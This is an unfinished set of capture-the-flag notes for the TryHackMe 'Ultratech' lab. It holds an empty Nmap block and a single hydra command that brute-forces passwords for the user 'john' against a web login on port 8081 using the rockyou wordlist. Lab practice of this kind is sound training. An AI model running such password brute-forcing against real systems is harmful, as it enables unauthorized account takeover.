#   Tryhackme - Ultratech

##  IP=10.10.250.19

##  Steps:
1.  Nmap scan:
```bash


```

hydra -l john -P /usr/share/wordlists/rockyou.txt 10.10.250.19:8081 http-post-form "//auth?login=john&password=^PASS^:Invalid credentials"